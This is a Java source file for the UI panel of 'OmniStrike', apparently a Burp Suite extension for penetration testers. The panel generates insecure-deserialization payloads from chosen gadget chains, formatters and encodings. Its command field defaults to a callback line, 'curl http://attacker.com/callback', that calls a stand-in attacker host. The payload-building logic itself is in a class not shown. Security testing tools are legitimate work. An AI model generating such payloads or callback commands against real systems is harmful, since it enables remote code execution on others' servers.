package com.omnistrike.ui.modules;

import burp.api.montoya.MontoyaApi;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.model.Finding;
import com.omnistrike.modules.injection.deser.DeserPayloadGenerator;
import com.omnistrike.modules.injection.deser.DeserPayloadGenerator.Encoding;
import com.omnistrike.modules.injection.deser.DeserPayloadGenerator.Language;

import javax.swing.*;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;

/**
 * Deserialization payload generator panel for OmniStrike.
 *
 * Pure payload generation — select language, chain, encoding, enter command,
 * generate payload with hex dump preview. No HTTP request input needed.
 */
public class DeserModulePanel extends JPanel {

    private static final String MODULE_ID = "deser-scanner";

    private final transient MontoyaApi api;
    private final transient FindingsStore findingsStore;

    private final JComboBox<Language> languageCombo;
    private final JComboBox<String> chainCombo;
    private final JLabel chainLabel;
    private final JComboBox<String> formatterCombo;
    private final JLabel formatterLabel;
    private final JComboBox<Encoding> encodingCombo;
    private final JTextField commandField;
    private final JTextArea previewArea;
    private final JLabel chainDescLabel;

    // Findings table
    private final DefaultTableModel findingsTableModel;
    private final List<Finding> findingsList = new ArrayList<>();
    private final javax.swing.Timer autoRefreshTimer;
    private int lastKnownFindingsCount = 0;

    public DeserModulePanel(MontoyaApi api, FindingsStore findingsStore) {
        super(new BorderLayout(0, 6));
        setBorder(BorderFactory.createEmptyBorder(10, 12, 10, 12));
        this.api = api;
        this.findingsStore = findingsStore;

        // ── Controls: Language, Chain, Encoding ─────────────────────────────
        languageCombo = new JComboBox<>(Language.values());
        languageCombo.setFont(new Font("Segoe UI", Font.PLAIN, 13));

        chainCombo = new JComboBox<>();
        chainCombo.setFont(new Font("Segoe UI", Font.PLAIN, 13));
        chainCombo.setPreferredSize(new Dimension(280, 28));

        chainLabel = label("Chain:");

        formatterCombo = new JComboBox<>();
        formatterCombo.setFont(new Font("Segoe UI", Font.PLAIN, 13));
        formatterCombo.setPreferredSize(new Dimension(200, 28));

        formatterLabel = label("Formatter:");
        formatterLabel.setVisible(false);
        formatterCombo.setVisible(false);

        encodingCombo = new JComboBox<>(Encoding.values());
        encodingCombo.setFont(new Font("Segoe UI", Font.PLAIN, 13));

        JPanel row1 = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
        row1.add(label("Language:"));
        row1.add(languageCombo);
        row1.add(chainLabel);
        row1.add(chainCombo);
        row1.add(formatterLabel);
        row1.add(formatterCombo);
        row1.add(label("Encoding:"));
        row1.add(encodingCombo);

        // ── Chain description label ─────────────────────────────────────────
        chainDescLabel = new JLabel(" ");
        chainDescLabel.setFont(new Font("Segoe UI", Font.ITALIC, 11));
        chainDescLabel.setForeground(new Color(100, 100, 100));
        chainDescLabel.setBorder(BorderFactory.createEmptyBorder(0, 12, 0, 0));

        // ── Command field ───────────────────────────────────────────────────
        commandField = new JTextField("curl http://attacker.com/callback", 40);
        commandField.setFont(new Font("Consolas", Font.PLAIN, 13));
        commandField.setToolTipText("OS command or callback URL for the payload");

        JPanel row2 = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
        row2.add(label("Command:"));
        row2.add(commandField);

        // ── Buttons ─────────────────────────────────────────────────────────
        JButton generateBtn = new JButton("Generate Payload");
        generateBtn.setFont(new Font("Segoe UI", Font.BOLD, 12));
        generateBtn.setToolTipText("Generate the deserialization payload");

        JButton copyB64Btn = new JButton("Copy Base64");
        copyB64Btn.setFont(new Font("Segoe UI", Font.PLAIN, 12));
        copyB64Btn.setToolTipText("Copy base64-encoded payload to clipboard");

        JButton copyRawBtn = new JButton("Copy Raw");
        copyRawBtn.setFont(new Font("Segoe UI", Font.PLAIN, 12));
        copyRawBtn.setToolTipText("Copy raw payload text to clipboard");

        JButton clearBtn = new JButton("Clear");
        clearBtn.setFont(new Font("Segoe UI", Font.PLAIN, 12));

        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        btnPanel.add(generateBtn);
        btnPanel.add(copyB64Btn);
        btnPanel.add(copyRawBtn);
        btnPanel.add(clearBtn);

        // ── Top section ─────────────────────────────────────────────────────
        JPanel topSection = new JPanel();
        topSection.setLayout(new BoxLayout(topSection, BoxLayout.Y_AXIS));
        topSection.add(row1);
        topSection.add(chainDescLabel);
        topSection.add(row2);
        topSection.add(btnPanel);

        // ── Payload preview (dark terminal style) ───────────────────────────
        previewArea = new JTextArea(18, 60);
        previewArea.setEditable(false);
        previewArea.setFont(new Font("Consolas", Font.BOLD, 13));
        previewArea.setBackground(new Color(30, 30, 30));
        previewArea.setForeground(new Color(0, 255, 128));
        previewArea.setCaretColor(new Color(0, 255, 128));
        previewArea.setLineWrap(true);
        previewArea.setWrapStyleWord(true);

        // ── Preview color selector ───────────────────────────────────────────
        JPanel colorPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        colorPanel.add(label("Text Color:"));
        ButtonGroup colorGroup = new ButtonGroup();
        JRadioButton greenRadio = new JRadioButton("Green");
        JRadioButton redRadio = new JRadioButton("Red");
        JRadioButton blueRadio = new JRadioButton("Blue");
        JRadioButton whiteRadio = new JRadioButton("White");
        greenRadio.setSelected(true);
        greenRadio.setFont(new Font("Segoe UI", Font.PLAIN, 12));
        redRadio.setFont(new Font("Segoe UI", Font.PLAIN, 12));
        blueRadio.setFont(new Font("Segoe UI", Font.PLAIN, 12));
        whiteRadio.setFont(new Font("Segoe UI", Font.PLAIN, 12));
        greenRadio.setForeground(new Color(0, 180, 80));
        redRadio.setForeground(new Color(220, 50, 50));
        blueRadio.setForeground(new Color(80, 140, 255));
        whiteRadio.setForeground(new Color(80, 80, 80));
        colorGroup.add(greenRadio);
        colorGroup.add(redRadio);
        colorGroup.add(blueRadio);
        colorGroup.add(whiteRadio);
        colorPanel.add(greenRadio);
        colorPanel.add(redRadio);
        colorPanel.add(blueRadio);
        colorPanel.add(whiteRadio);

        java.awt.event.ActionListener colorAction = e -> {
            Color c;
            if (redRadio.isSelected()) c = new Color(255, 80, 80);
            else if (blueRadio.isSelected()) c = new Color(100, 160, 255);
            else if (whiteRadio.isSelected()) c = Color.WHITE;
            else c = new Color(0, 255, 128);
            previewArea.setForeground(c);
            previewArea.setCaretColor(c);
        };
        greenRadio.addActionListener(colorAction);
        redRadio.addActionListener(colorAction);
        blueRadio.addActionListener(colorAction);
        whiteRadio.addActionListener(colorAction);

        JPanel previewWrapper = new JPanel(new BorderLayout());
        previewWrapper.add(colorPanel, BorderLayout.NORTH);
        previewWrapper.add(new JScrollPane(previewArea), BorderLayout.CENTER);
        previewWrapper.setBorder(BorderFactory.createTitledBorder(
                BorderFactory.createLineBorder(new Color(60, 60, 60)),
                "Payload Preview",
                javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION,
                javax.swing.border.TitledBorder.DEFAULT_POSITION,
                new Font("Segoe UI", Font.BOLD, 12)));

        // ── Findings table ──────────────────────────────────────────────────
        findingsTableModel = new DefaultTableModel(
                new String[]{"Severity", "Title", "URL", "Parameter", "Time"}, 0) {
            @Override public boolean isCellEditable(int r, int c) { return false; }
        };
        JTable findingsTable = new JTable(findingsTableModel);
        findingsTable.setRowHeight(20);
        findingsTable.setAutoCreateRowSorter(true);
        findingsTable.getColumnModel().getColumn(0).setCellRenderer(createSeverityRenderer());

        JTextArea findingsDetailArea = new JTextArea(4, 60);
        findingsDetailArea.setEditable(false);
        findingsDetailArea.setFont(new Font("Consolas", Font.PLAIN, 13));
        findingsDetailArea.setLineWrap(true);

        findingsTable.getSelectionModel().addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                int row = findingsTable.getSelectedRow();
                if (row >= 0) {
                    int modelRow = findingsTable.convertRowIndexToModel(row);
                    if (modelRow >= 0 && modelRow < findingsList.size()) {
                        Finding f = findingsList.get(modelRow);
                        findingsDetailArea.setText(
                                "Evidence: " + (f.getEvidence() != null ? f.getEvidence() : "") +
                                "\nDescription: " + (f.getDescription() != null ? f.getDescription() : "") +
                                "\nRemediation: " + (f.getRemediation() != null ? f.getRemediation() : ""));
                        findingsDetailArea.setCaretPosition(0);
                    }
                }
            }
        });

        // Right-click on findings table
        JPopupMenu findingsPopup = new JPopupMenu();
        JMenuItem sendToRepeater = new JMenuItem("Send to Repeater");
        sendToRepeater.addActionListener(e -> {
            int row = findingsTable.getSelectedRow();
            if (row < 0) return;
            int modelRow = findingsTable.convertRowIndexToModel(row);
            if (modelRow < 0 || modelRow >= findingsList.size()) return;
            Finding f = findingsList.get(modelRow);
            if (f.getRequestResponse() != null && f.getRequestResponse().request() != null) {
                api.repeater().sendToRepeater(f.getRequestResponse().request(),
                        "Deser: " + truncate(f.getTitle(), 30));
            }
        });
        findingsPopup.add(sendToRepeater);
        findingsTable.setComponentPopupMenu(findingsPopup);

        // ── Bottom tabs: Preview + Findings ─────────────────────────────────
        JTabbedPane toolTabs = new JTabbedPane();
        toolTabs.setFont(new Font("Segoe UI", Font.PLAIN, 12));
        toolTabs.addTab("Payload Preview", previewWrapper);

        JSplitPane findingsSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT,
                new JScrollPane(findingsTable), new JScrollPane(findingsDetailArea));
        findingsSplit.setResizeWeight(0.6);
        findingsSplit.setDividerLocation(200);
        toolTabs.addTab("Findings (" + findingsList.size() + ")", findingsSplit);

        // ── Main layout ─────────────────────────────────────────────────────
        JSplitPane mainSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT,
                topSection, toolTabs);
        mainSplit.setResizeWeight(0.15);
        mainSplit.setDividerLocation(140);

        add(mainSplit, BorderLayout.CENTER);

        // ── Wire events ─────────────────────────────────────────────────────
        populateChains();
        updateChainDescription();
        languageCombo.addActionListener(e -> { populateChains(); updateChainDescription(); });
        chainCombo.addActionListener(e -> { populateFormatters(); updateChainDescription(); });

        generateBtn.addActionListener(e -> generatePayload());
        copyB64Btn.addActionListener(e -> copyBase64());
        copyRawBtn.addActionListener(e -> copyRaw());
        clearBtn.addActionListener(e -> previewArea.setText(""));

        // Auto-refresh findings every 3 seconds
        autoRefreshTimer = new javax.swing.Timer(3000, e -> autoRefreshFindings(toolTabs));
        autoRefreshTimer.start();
    }

    /** Stop timers on extension unload. */
    public void stopTimers() {
        if (autoRefreshTimer != null) {
            autoRefreshTimer.stop();
        }
    }

    // ── Chain population ──────────────────────────────────────────────────────

    private void populateChains() {
        Language lang = (Language) languageCombo.getSelectedItem();
        if (lang == null) return;

        chainCombo.removeAllItems();

        if (lang == Language.DOTNET) {
            chainLabel.setText("Gadget:");
            Map<String, String> gadgets = DeserPayloadGenerator.getDotNetGadgets();
            for (String name : gadgets.keySet()) {
                chainCombo.addItem(name);
            }
            formatterLabel.setVisible(true);
            formatterCombo.setVisible(true);
            populateFormatters();
        } else {
            chainLabel.setText("Chain:");
            Map<String, String> chains = DeserPayloadGenerator.getAvailableChains(lang);
            for (String name : chains.keySet()) {
                chainCombo.addItem(name);
            }
            formatterLabel.setVisible(false);
            formatterCombo.setVisible(false);
        }
    }

    private void populateFormatters() {
        Language lang = (Language) languageCombo.getSelectedItem();
        if (lang != Language.DOTNET) return;

        String gadget = (String) chainCombo.getSelectedItem();
        formatterCombo.removeAllItems();
        if (gadget != null) {
            for (String fmt : DeserPayloadGenerator.getDotNetFormatters(gadget)) {
                formatterCombo.addItem(fmt);
            }
        }
    }

    private void updateChainDescription() {
        Language lang = (Language) languageCombo.getSelectedItem();
        String chain = (String) chainCombo.getSelectedItem();
        if (lang == null || chain == null) {
            chainDescLabel.setText(" ");
            return;
        }
        String desc;
        if (lang == Language.DOTNET) {
            Map<String, String> gadgets = DeserPayloadGenerator.getDotNetGadgets();
            desc = gadgets.get(chain);
        } else {
            Map<String, String> chains = DeserPayloadGenerator.getAvailableChains(lang);
            desc = chains.get(chain);
        }
        chainDescLabel.setText(desc != null ? desc : " ");
    }

    // ── Payload generation ────────────────────────────────────────────────────

    private byte[] lastGeneratedPayload;

    private void generatePayload() {
        Language lang = (Language) languageCombo.getSelectedItem();
        String chain = (String) chainCombo.getSelectedItem();
        Encoding enc = (Encoding) encodingCombo.getSelectedItem();
        String command = commandField.getText().trim();
        String formatter = (String) formatterCombo.getSelectedItem();

        if (lang == null || chain == null || command.isEmpty()) {
            JOptionPane.showMessageDialog(this,
                    "Please select language, chain, and enter a command.",
                    "Generate Payload", JOptionPane.WARNING_MESSAGE);
            return;
        }

        try {
            byte[] payload;
            String headerExtra;
            if (lang == Language.DOTNET && formatter != null && !formatter.isEmpty()) {
                payload = DeserPayloadGenerator.generate(lang, chain, formatter, command, enc);
                headerExtra = " | Gadget: " + chain + " | Formatter: " + formatter;
            } else {
                payload = DeserPayloadGenerator.generate(lang, chain, command, enc);
                headerExtra = " | Chain: " + chain;
            }
            lastGeneratedPayload = payload;

            String hexDump = DeserPayloadGenerator.toHexDump(payload, 1024);
            String b64 = java.util.Base64.getEncoder().encodeToString(payload);
            String decoded = new String(payload, StandardCharsets.UTF_8);

            previewArea.setText(
                    "Language: " + lang + headerExtra +
                    " | Encoding: " + enc + " | Size: " + payload.length + " bytes\n" +
                    "═══════════════════════════════════════════════════════════════\n\n" +
                    "── Base64 (copy-paste ready) ─────────────────────────────────\n" +
                    b64 + "\n\n" +
                    "── Hex Dump ──────────────────────────────────────────────────\n" +
                    hexDump + "\n" +
                    "── Decoded ───────────────────────────────────────────────────\n" +
                    (decoded.length() > 2000 ? decoded.substring(0, 2000) + "\n... (truncated)" : decoded));
            previewArea.setCaretPosition(0);
        } catch (Exception e) {
            previewArea.setText("[!] Generation failed: " + e.getMessage());
            lastGeneratedPayload = null;
        }
    }

    private void copyBase64() {
        if (lastGeneratedPayload == null) {
            JOptionPane.showMessageDialog(this, "Generate a payload first.",
                    "Copy", JOptionPane.INFORMATION_MESSAGE);
            return;
        }
        String b64 = java.util.Base64.getEncoder().encodeToString(lastGeneratedPayload);
        Toolkit.getDefaultToolkit().getSystemClipboard()
                .setContents(new StringSelection(b64), null);
    }

    private void copyRaw() {
        if (lastGeneratedPayload == null) {
            JOptionPane.showMessageDialog(this, "Generate a payload first.",
                    "Copy", JOptionPane.INFORMATION_MESSAGE);
            return;
        }
        String raw = new String(lastGeneratedPayload, StandardCharsets.UTF_8);
        Toolkit.getDefaultToolkit().getSystemClipboard()
                .setContents(new StringSelection(raw), null);
    }

    // ── Findings auto-refresh ─────────────────────────────────────────────────

    private void autoRefreshFindings(JTabbedPane tabs) {
        SwingUtilities.invokeLater(() -> {
            List<Finding> current = findingsStore.getFindingsByModule(MODULE_ID);
            if (current.size() != lastKnownFindingsCount) {
                lastKnownFindingsCount = current.size();
                findingsTableModel.setRowCount(0);
                findingsList.clear();
                SimpleDateFormat fmt = new SimpleDateFormat("HH:mm:ss");
                for (Finding f : current) {
                    findingsList.add(f);
                    findingsTableModel.addRow(new Object[]{
                            f.getSeverity() != null ? f.getSeverity().name() : "",
                            f.getTitle() != null ? f.getTitle() : "",
                            f.getUrl() != null ? f.getUrl() : "",
                            f.getParameter() != null ? f.getParameter() : "",
                            fmt.format(new java.util.Date(f.getTimestamp()))
                    });
                }
                for (int i = 0; i < tabs.getTabCount(); i++) {
                    if (tabs.getTitleAt(i).startsWith("Findings")) {
                        tabs.setTitleAt(i, "Findings (" + current.size() + ")");
                        break;
                    }
                }
            }
        });
    }

    // ── UI helpers ────────────────────────────────────────────────────────────

    private static JLabel label(String text) {
        JLabel l = new JLabel(text);
        l.setFont(new Font("Segoe UI", Font.BOLD, 12));
        return l;
    }

    private static String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }

    private DefaultTableCellRenderer createSeverityRenderer() {
        return new DefaultTableCellRenderer() {
            @Override
            public Component getTableCellRendererComponent(JTable table, Object value,
                    boolean isSelected, boolean hasFocus, int row, int column) {
                Component c = super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
                if (!isSelected && value != null) {
                    String sev = value.toString();
                    switch (sev) {
                        case "CRITICAL" -> { c.setBackground(new Color(180, 30, 30)); c.setForeground(Color.WHITE); }
                        case "HIGH" -> { c.setBackground(new Color(220, 80, 40)); c.setForeground(Color.WHITE); }
                        case "MEDIUM" -> { c.setBackground(new Color(230, 160, 30)); c.setForeground(Color.BLACK); }
                        case "LOW" -> { c.setBackground(new Color(70, 140, 200)); c.setForeground(Color.WHITE); }
                        case "INFO" -> { c.setBackground(new Color(130, 130, 130)); c.setForeground(Color.WHITE); }
                        default -> { c.setBackground(table.getBackground()); c.setForeground(table.getForeground()); }
                    }
                } else if (!isSelected) {
                    c.setBackground(table.getBackground());
                    c.setForeground(table.getForeground());
                }
                setHorizontalAlignment(SwingConstants.CENTER);
                return c;
            }
        };
    }
}
